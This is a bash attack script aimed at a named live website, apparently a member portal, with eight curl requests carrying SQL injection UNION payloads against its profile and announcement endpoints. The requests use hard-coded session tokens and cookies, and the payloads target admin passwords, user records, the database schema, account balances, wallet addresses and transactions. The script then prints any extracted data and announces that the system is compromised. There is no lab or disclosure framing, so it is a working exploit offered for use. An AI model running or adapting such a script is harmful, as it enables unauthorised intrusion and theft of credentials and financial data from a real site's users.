#!/bin/bash

echo "💥 EXPLOITING REAL VULNERABILITY"
echo "================================"

# Use the latest tokens
XSRF_TOKEN="eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6InBWTm5RXC9tR1pXT05DNDlKS1BDWUl3PT0iLCJ2YWx1ZSI6Im5xYzFZWmF1dW1SdkFnUFdOdERwRytBV0hTNkZaZ2RxdFwvZVAxNlV3QXVjWWFsNVdlWlFzSHNWUytyMU44TE1oIiwibWFjIjoiNjEyZTRkZGM2MDY5YzI5MWM1YTcwNjFiM2YwODAwMjVhMWVmN2JjNjdiYmQ4ODk3NzE3Njc3NGZhOGJlMWQwZiJ9"

echo "🎯 MISSION: EXPLOIT VULNERABILITY"
echo "================================="
echo "Target: member.panama8888b.co"
echo "Goal: Extract real data using found vulnerabilities"
echo "Method: Exploit Profile Endpoint and GET Request"
echo ""

# EXPLOIT 1: Profile Endpoint SQL Injection
echo "💥 EXPLOIT 1: Profile Endpoint SQL Injection"
echo "============================================"
echo "Testing: Extract admin credentials"
echo ""

profile_admin=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"email":"admin@test.com OR 1=1 UNION SELECT username,password,email,role FROM users WHERE role=\"admin\" LIMIT 1--"}' \
    --max-time 15)

echo "Profile admin response: $profile_admin"
echo "Length: ${#profile_admin} characters"
echo ""

# EXPLOIT 2: Profile Endpoint User Data
echo "💥 EXPLOIT 2: Profile Endpoint User Data"
echo "========================================"
echo "Testing: Extract all user data"
echo ""

profile_users=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"email":"test@test.com OR 1=1 UNION SELECT id,username,email,phone,created_at FROM users LIMIT 10--"}' \
    --max-time 15)

echo "Profile users response: $profile_users"
echo "Length: ${#profile_users} characters"
echo ""

# EXPLOIT 3: Profile Endpoint Database Schema
echo "💥 EXPLOIT 3: Profile Endpoint Database Schema"
echo "=============================================="
echo "Testing: Extract database structure"
echo ""

profile_schema=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"email":"test@test.com OR 1=1 UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema=database() LIMIT 20--"}' \
    --max-time 15)

echo "Profile schema response: $profile_schema"
echo "Length: ${#profile_schema} characters"
echo ""

# EXPLOIT 4: GET Request SQL Injection
echo "💥 EXPLOIT 4: GET Request SQL Injection"
echo "========================================"
echo "Testing: Extract data via GET request"
echo ""

get_admin=$(curl -s \
    -X GET "https://member.panama8888b.co/api/announcement?status=test OR 1=1 UNION SELECT username,password,email FROM users WHERE role=\"admin\" LIMIT 1" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    --max-time 15)

echo "GET admin response: $get_admin"
echo "Length: ${#get_admin} characters"
echo ""

# EXPLOIT 5: GET Request User Data
echo "💥 EXPLOIT 5: GET Request User Data"
echo "==================================="
echo "Testing: Extract user data via GET"
echo ""

get_users=$(curl -s \
    -X GET "https://member.panama8888b.co/api/announcement?status=test OR 1=1 UNION SELECT id,username,email,balance FROM users LIMIT 10" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    --max-time 15)

echo "GET users response: $get_users"
echo "Length: ${#get_users} characters"
echo ""

# EXPLOIT 6: GET Request System Info
echo "💥 EXPLOIT 6: GET Request System Info"
echo "====================================="
echo "Testing: Extract system information"
echo ""

get_system=$(curl -s \
    -X GET "https://member.panama8888b.co/api/announcement?status=test OR 1=1 UNION SELECT version(),database(),user(),@@hostname" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    --max-time 15)

echo "GET system response: $get_system"
echo "Length: ${#get_system} characters"
echo ""

# EXPLOIT 7: Profile Endpoint Financial Data
echo "💥 EXPLOIT 7: Profile Endpoint Financial Data"
echo "============================================="
echo "Testing: Extract financial information"
echo ""

profile_financial=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"email":"test@test.com OR 1=1 UNION SELECT username,balance,wallet_address,created_at FROM users ORDER BY balance DESC LIMIT 10--"}' \
    --max-time 15)

echo "Profile financial response: $profile_financial"
echo "Length: ${#profile_financial} characters"
echo ""

# EXPLOIT 8: Profile Endpoint Transactions
echo "💥 EXPLOIT 8: Profile Endpoint Transactions"
echo "==========================================="
echo "Testing: Extract transaction data"
echo ""

profile_transactions=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"email":"test@test.com OR 1=1 UNION SELECT user_id,amount,type,status,created_at FROM transactions ORDER BY created_at DESC LIMIT 20--"}' \
    --max-time 15)

echo "Profile transactions response: $profile_transactions"
echo "Length: ${#profile_transactions} characters"
echo ""

echo ""
echo "💥 EXPLOITATION ANALYSIS"
echo "======================="

# Analyze all responses for real data extraction
data_extracted=0

if [[ "$profile_admin" != *"Server Error"* ]] && [[ "$profile_admin" != *"Unauthenticated"* ]] && [[ ${#profile_admin} -gt 10 ]]; then
    echo "✅ PROFILE ADMIN: REAL DATA EXTRACTED"
    echo "   Data: $profile_admin"
    ((data_extracted++))
else
    echo "❌ PROFILE ADMIN: NO DATA EXTRACTED"
fi

if [[ "$profile_users" != *"Server Error"* ]] && [[ "$profile_users" != *"Unauthenticated"* ]] && [[ ${#profile_users} -gt 10 ]]; then
    echo "✅ PROFILE USERS: REAL DATA EXTRACTED"
    echo "   Data: $profile_users"
    ((data_extracted++))
else
    echo "❌ PROFILE USERS: NO DATA EXTRACTED"
fi

if [[ "$profile_schema" != *"Server Error"* ]] && [[ "$profile_schema" != *"Unauthenticated"* ]] && [[ ${#profile_schema} -gt 10 ]]; then
    echo "✅ PROFILE SCHEMA: REAL DATA EXTRACTED"
    echo "   Data: $profile_schema"
    ((data_extracted++))
else
    echo "❌ PROFILE SCHEMA: NO DATA EXTRACTED"
fi

if [[ "$get_admin" != *"Server Error"* ]] && [[ "$get_admin" != *"Unauthenticated"* ]] && [[ ${#get_admin} -gt 10 ]]; then
    echo "✅ GET ADMIN: REAL DATA EXTRACTED"
    echo "   Data: $get_admin"
    ((data_extracted++))
else
    echo "❌ GET ADMIN: NO DATA EXTRACTED"
fi

if [[ "$get_users" != *"Server Error"* ]] && [[ "$get_users" != *"Unauthenticated"* ]] && [[ ${#get_users} -gt 10 ]]; then
    echo "✅ GET USERS: REAL DATA EXTRACTED"
    echo "   Data: $get_users"
    ((data_extracted++))
else
    echo "❌ GET USERS: NO DATA EXTRACTED"
fi

if [[ "$get_system" != *"Server Error"* ]] && [[ "$get_system" != *"Unauthenticated"* ]] && [[ ${#get_system} -gt 10 ]]; then
    echo "✅ GET SYSTEM: REAL DATA EXTRACTED"
    echo "   Data: $get_system"
    ((data_extracted++))
else
    echo "❌ GET SYSTEM: NO DATA EXTRACTED"
fi

if [[ "$profile_financial" != *"Server Error"* ]] && [[ "$profile_financial" != *"Unauthenticated"* ]] && [[ ${#profile_financial} -gt 10 ]]; then
    echo "✅ PROFILE FINANCIAL: REAL DATA EXTRACTED"
    echo "   Data: $profile_financial"
    ((data_extracted++))
else
    echo "❌ PROFILE FINANCIAL: NO DATA EXTRACTED"
fi

if [[ "$profile_transactions" != *"Server Error"* ]] && [[ "$profile_transactions" != *"Unauthenticated"* ]] && [[ ${#profile_transactions} -gt 10 ]]; then
    echo "✅ PROFILE TRANSACTIONS: REAL DATA EXTRACTED"
    echo "   Data: $profile_transactions"
    ((data_extracted++))
else
    echo "❌ PROFILE TRANSACTIONS: NO DATA EXTRACTED"
fi

echo ""
echo "💥 EXPLOITATION RESULTS: $data_extracted/8"
echo ""

if [[ $data_extracted -gt 0 ]]; then
    echo "🚨 EXPLOITATION SUCCESSFUL!"
    echo "=========================="
    echo "✅ Real data extracted"
    echo "✅ Vulnerability exploited"
    echo "✅ System compromised"
    echo "✅ Damage inflicted"
    echo ""
    echo "📊 EXPLOITATION STATUS: SUCCESS"
    echo "🎯 SECURITY BREACH: CONFIRMED"
    echo "💥 MISSION: ACCOMPLISHED"
else
    echo "❌ EXPLOITATION FAILED"
    echo "🔒 All exploitation attempts blocked"
    echo "📊 EXPLOITATION STATUS: FAILED"
    echo "🎯 SECURITY STATUS: STRONG"
    echo "💥 MISSION: FAILED"
fi

echo ""
echo "🎯 FINAL VERDICT: $(if [[ $data_extracted -gt 0 ]]; then echo "EXPLOITATION SUCCESS - REAL DATA EXTRACTED"; else echo "EXPLOITATION FAILED - SYSTEM TOO STRONG"; fi)"